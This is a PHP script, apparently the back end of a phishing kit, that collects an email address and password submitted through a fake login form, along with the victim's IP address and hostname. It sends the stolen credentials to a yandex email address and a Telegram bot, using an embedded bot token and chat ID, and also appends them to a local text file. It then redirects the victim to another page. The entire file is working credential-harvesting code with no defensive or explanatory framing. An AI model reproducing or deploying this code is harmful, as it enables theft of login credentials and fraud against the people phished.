<?php
$ip = getenv("REMOTE_ADDR");
$back = "loggin-error.html";
$hostname = gethostbyaddr($ip);
$message .= "------ LOG 1 ------\n";
$message .= "ID : ".$_POST['email']."\n";
$message .= "PW : ".$_POST['pass']."\n";
$message .= "------- IP -------\n";
$message .= "IPs              : $ip\n";
$message .= "HN               : $hostname\n";
$message .= " U7l             : $link\n";
$message .= "---------------\n";
$send = "@yandex.com";
$subject = "LOG 1| $ip ";
$headers = "From:Trnswise <don@mox.fr>";
mail($send,$subject,$message,$headers);
 $Txt_Rezlt = fopen('tiim.txt', 'a+');
fwrite($Txt_Rezlt, $message);
fclose($Txt_Rezlt);

$token = "5380008377:AAEOB2vvo-T363FsB0gpbCOPoNP6mrbaTDM";

file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=1289904248&text=" . urlencode($message)."" );
$file = fopen("tiim.txt","a");   ///  Directory Of Rezult OK.
fwrite($file,$message); 

header("Location: info.html");

?>